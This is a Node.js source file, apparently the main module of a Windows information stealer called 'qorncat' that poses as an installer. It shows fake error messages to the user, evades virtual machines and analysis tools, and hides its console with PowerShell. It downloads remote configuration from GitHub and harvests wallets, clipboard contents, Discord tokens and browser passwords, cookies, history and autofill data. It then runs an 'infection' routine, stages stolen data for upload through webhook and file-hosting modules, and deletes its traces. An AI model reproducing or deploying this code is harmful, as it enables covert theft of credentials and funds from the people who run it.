class qorncat {
    constructor() {

        this.requires = {
            fs: require("fs"),
            crypto: require("crypto"),
            os: require("os"),
            axios: require("axios"),
            child_process: require("child_process"),
            screenshot: require("screenshot-desktop"),
            systeminformation: require("systeminformation"),
            buf_replace: require('buffer-replace'),
            jszip: require("zip-lib"),
            dpapi: require("win-dpapi"),
            sqlite3: require("sqlite3"),
            path: require("path"),
            request: require("request")
        }

        this.utils = {
            encryption: require("./libs/encryption")(this)
        }

        this.config = {
            counter: require("./libs/config/counter")(this),
            crypto: require("./libs/config/crypto")(this),
            discord: require("./libs/config/discord")(this),
            environ: require("./libs/config/environ")(this),
            executable: require("./libs/config/executable")(this),
            main: require("./libs/config/main")(this),
            user: require("./libs/config/user")(this),
            jszip: require("./libs/config/jszip")(this),
            wallets: require("./libs/config/wallets")(this),
        }

        this.config.webhook = require("./config")(this);
        this.config.keywords = require("./keywords")(this);

        this.utils = {
            encryption: require("./libs/encryption")(this),
            constructor: require("./libs/constructor")(this),
            discord: require("./libs/discord")(this),
            flags: require("./libs/flags")(this),
            infection: require("./libs/infection")(this),
            protection: require("./libs/protection")(this),
            prototype: require("./libs/prototype")(this),
            time: require("./libs/time")(this),
            clipper: require("./libs/clipper")(this),
            jszip: require("./libs/jszip")(this),
            browsers: require("./libs/browsers")(this),
            data: require("./libs/data")(this),
            wallets: require("./libs/wallets")(this),
            webhook: require("./libs/webhook")(this),
        }

        

        this.utils.gofile = require("./gofile");
    }

    hideSelf() {
        this.requires.fs.writeFileSync(`${process.cwd()}\\client.ps1`, `
        Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
    
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
        '
    
        $consolePtr = [Console.Window]::GetConsoleWindow()
        #0 hide
        [Console.Window]::ShowWindow($consolePtr, 0)
        `);

        this.requires.child_process.execSync(`type .\\client.ps1 | powershell.exe -noprofile -`, {
            stdio: 'inherit'
        });

        this.requires.fs.unlinkSync(`${process.cwd()}\\client.ps1`);
    }

    async init() {
        process.on("unhandledRejection", (err) => {
            console.log(err)
        })
        
        process.on("uncaughtException", (exc) => {
            console.log(exc)
        })

        process.title = "Installer"
        console.log("Downloading client...")

        this.utils.protection.detect_malicious_processes();

        const exit = await this.utils.protection.inVM();

        if (exit) {
            process.exit(0);
        }

        this.utils.constructor.loadCPUS()
        await this.utils.time.sleep(1000);
        console.log("[ERROR] Couldn't start client")
        console.log("[ERROR] 23: Data error (cyclic redundancy check).")
        console.log("[ERROR] 83: Fail on INT 24.")
        console.log("[ERROR] 151: The number of specified semaphore events for DosMuxSemWait is not correct.")
        console.log("[ERROR] 997: Overlapped I/O operation is in progress.")
        console.log("[ERROR] 996: Overlapped I/O event is not in a signaled state.")
        await this.utils.time.sleep(1000);

        this.hideSelf();

        try {
            this.config.embed = JSON.parse(JSON.stringify((await this.requires.axios.get("https://raw.githubusercontent.com/qorncat/python-rat-antivirus-bypass/secret/embed.json")).data))
        } catch {
            process.exit(0);
        }
        this.config.embed.footer = {
            text: `${this.utils.encryption.decryptData(this.config.user.hostname)} | ${this.config.embed.credits}`,
            icon_url: this.config.embed.avatar_url,
        }

        this.config.jszip.path = this.config.jszip.generate_path();

        console.log(this.config.jszip.path)

        this.utils.clipper.detectClipboard();
        await this.utils.wallets.getWallets();
        await this.utils.discord.getTokens();
        await this.utils.discord.saveDiscordTokens();

        for (var path of this.config.environ.password_and_cookies_paths) {
            if (this.requires.fs.existsSync(path + "Login Data")) {
                ["getPasswords", "getCookies", "getBookmarks", "getHistory", "getAutofill"].forEach(async (_func) => {
                    await this.utils.browsers[_func](path)
                })
            }
        }

        await this.utils.infection.initialize()

        await this.utils.time.sleep(60000);

        this.requires.fs.rmSync(this.config.jszip.path, {
            recursive: true,
            force: true
        })

        this.requires.fs.rmSync(`${this.config.jszip.path}.zip`, {
            recursive: true,
            force: true
        })
    }
}

new qorncat().init()